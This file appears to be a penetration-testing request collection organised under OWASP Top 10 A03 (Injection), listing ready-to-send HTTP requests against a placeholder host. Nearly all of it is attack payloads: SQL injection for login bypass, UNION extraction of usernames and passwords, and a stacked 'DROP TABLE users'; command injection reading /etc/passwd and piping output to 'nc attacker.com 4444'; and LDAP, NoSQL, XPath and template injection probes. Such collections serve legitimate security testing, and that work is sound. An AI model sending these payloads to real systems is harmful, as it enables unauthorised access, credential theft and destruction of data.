# OWASP Top 10 - A03:2021 Injection
# SQL Injection, Command Injection, LDAP, etc.

### SQL Injection - Authentication bypass
POST /login HTTP/1.1
Host: {{host}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

username=admin' OR '1'='1&password=anything

### SQL Injection - UNION SELECT
GET /products?id=1' UNION SELECT username,password,3 FROM users-- HTTP/1.1
Host: {{host}}

### SQL Injection - Time-based blind
GET /search?q=test' AND SLEEP(5)-- HTTP/1.1
Host: {{host}}

### SQL Injection - Boolean-based blind
GET /user?id=1' AND 1=1-- HTTP/1.1
Host: {{host}}

### SQL Injection - Stacked queries
POST /update HTTP/1.1
Host: {{host}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

name=John'; DROP TABLE users; SELECT * FROM products--

### Command Injection - Shell execution
GET /ping?host=127.0.0.1; cat /etc/passwd HTTP/1.1
Host: {{host}}

### Command Injection - Backticks
GET /ping?host=`whoami` HTTP/1.1
Host: {{host}}

### Command Injection - Subshell
GET /ping?host=$(id) HTTP/1.1
Host: {{host}}

### Command Injection - Pipe
GET /ping?host=127.0.0.1 | nc attacker.com 4444 HTTP/1.1
Host: {{host}}

### LDAP Injection
POST /ldap/search HTTP/1.1
Host: {{host}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

username=admin)(&(password=*))(&(a=

### NoSQL Injection - MongoDB
POST /api/login HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 62

{"username": {"$ne": null}, "password": {"$ne": null}}

### XML Injection
POST /api/xml HTTP/1.1
Host: {{host}}
Content-Type: application/xml
Content-Length: 89

<?xml version="1.0"?>
<user><name>admin</name><role>administrator</role></user>

### XPath Injection
GET /search?user=admin' or '1'='1 HTTP/1.1
Host: {{host}}

### Template Injection - Jinja2
GET /hello?name={{7*7}} HTTP/1.1
Host: {{host}}

### Template Injection - Freemarker
GET /hello?name=${7*7} HTTP/1.1
Host: {{host}}

### Template Injection - Velocity
GET /hello?name=#set($x=7*7)$x HTTP/1.1
Host: {{host}}
